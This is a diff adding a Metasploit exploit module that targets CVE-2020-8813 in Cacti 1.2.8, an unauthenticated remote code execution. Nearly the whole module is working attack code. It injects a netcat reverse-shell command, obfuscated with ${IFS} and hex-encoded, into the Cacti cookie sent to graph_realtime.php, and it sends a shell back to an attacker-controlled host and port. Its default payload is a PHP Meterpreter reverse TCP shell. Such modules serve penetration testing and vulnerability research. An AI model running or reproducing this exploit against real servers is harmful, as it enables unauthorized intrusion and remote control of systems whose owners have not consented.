@@ -1,0 +1,82 @@
+# Exploit Title: Cacti v1.2.8 - Unauthenticated Remote Code Execution (Metasploit)
+# Date: 2020-02-29
+# Exploit Author: Lucas Amorim (sh286)s
+# CVE: CVE-2020-8813
+# Vendor Homepage: https://cacti.net/
+# Version: v1.2.8
+# Tested on: Linux
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'        => 'Cacti v1.2.8 Unauthenticated Remote Code Execution',
+      'Description' => %q{graph_realtime.php in Cacti 1.2.8 allows remote attackers to 
+        execute arbitrary OS commands via shell metacharacters in a cookie, if a guest user has 
+        the graph real-time privilege.},
+      'Author' =>
+        [
+          'Lucas Amorim ' # MSF module
+        ],
+      'License' => MSF_LICENSE,
+      'Platform' => 'php',
+      'References' =>
+        [
+          ['CVE', '2020-8813']
+        ],
+      'DisclosureDate' => 'Feb 21 2020',
+      'Privileged' => true,
+      'DefaultOptions' => {
+        'PAYLOAD' => 'php/meterpreter/reverse_tcp',
+        'SSL' => true,
+      },
+      'Targets' => [
+        ['Automatic', {}]
+      ],
+      'DefaultTarget'   => 0))
+
+      register_options(
+        [
+          Opt::RPORT(443),
+          OptString.new('RPATH', [ false, "path to cacti", "" ])
+        ])
+
+        deregister_options('VHOST')
+  end
+
+  def check
+    res = send_request_raw(
+      'method' => 'GET',
+      'uri' => "#{datastore['RPATH']}/graph_realtime.php?action=init"
+    )
+
+    if res && res.code == 200
+      return Exploit::CheckCode::Vulnerable
+    else
+      return Exploit::CheckCode::Safe
+    end
+  end
+
+  def send_payload()
+    exec_payload=(";nc${IFS}-e${IFS}/bin/bash${IFS}%s${IFS}%s" % [datastore['LHOST'], datastore['LPORT']])
+    send_request_raw(
+      'uri' => "#{datastore['RPATH']}/graph_realtime.php?action=init",
+      'method' => 'GET',
+      'cookie' => "Cacti=#{Rex::Text.uri_encode(exec_payload, mode = 'hex-normal')}"
+    )
+  end
+
+  def exploit
+    if check == Exploit::CheckCode::Vulnerable
+      print_good("Target seems to be a vulnerable")
+      send_payload()
+    else
+      print_error("Target does not seem to be vulnerable. Will exit now...")
+    end
+  end
+end
